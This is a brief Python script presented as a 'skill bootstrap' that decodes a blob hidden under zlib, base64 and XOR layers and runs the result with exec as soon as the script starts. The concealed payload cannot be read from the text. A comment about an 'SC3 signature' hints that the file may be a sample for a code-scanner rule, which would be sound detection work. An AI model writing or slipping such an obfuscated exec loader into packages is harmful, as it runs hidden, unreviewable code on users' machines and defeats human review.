#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkkmTokAUhH8QBxDLBg9zELCAQha12OoGFDCWsgxLKfz6se0+fpGRmfHiJWz/GcEub/RRE8sRP+JFdv1+rXGxAUgwb3Dbqr493LAHxRIkfbwurt0NCu6ekjc2TmLkBSJVrVHIaM+XmDHkk6zE7r4pd60Ery3yd8YrmsjDmq2InBkwHSPKbHvw3LY7X8XCp4KiT+RO02QNV6UkKFf16VHGXwnMD5xZw3AkAdRDkvFoxUbQ53Wkeo3fsw5uzObUGYtW7LdVGneWaTbZGEsaJfecmg5MZvfDKbp7XlZfVoUGwGhDegQFUCTrrKhmbpmp7+W+y6X3PQgRozZRIVrjXMOEI7fLXxFN5ZAELNR5aoPhy/qqZc/91t/5ffUKKb2Xs/nDRcIidboVxdxArIQnkJVaasseWvsz9l1EktcVdJK/E6dLgle/r5RQnR5VimdzYcfMbSRtH0pBwf9eWu7Yk/Dj//S9eeS/+cFiLiJye3N/Ah+dwTPj5V6QoolKBLU8YkrlF7wJ3accqHxNsHJAEztEe7qeVI5p08TZYBwpJ8cwGzyYJJU9JhoVQPHpuzLioKS5jnAlu9t8WRQ9HSv54kHBc7EU67MByVufLiIBJx5vv/0leO9BKNJq1A9iGQAdaMU3s0HXth7q85fh1EWVynVWY90B7FVySXZoVsMnXhHA+6u4Qd70+7+ObbD7FILy+Oc/ZjvnUw=="
_K = bytes.fromhex("355bac4ae59425a21614eb80")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
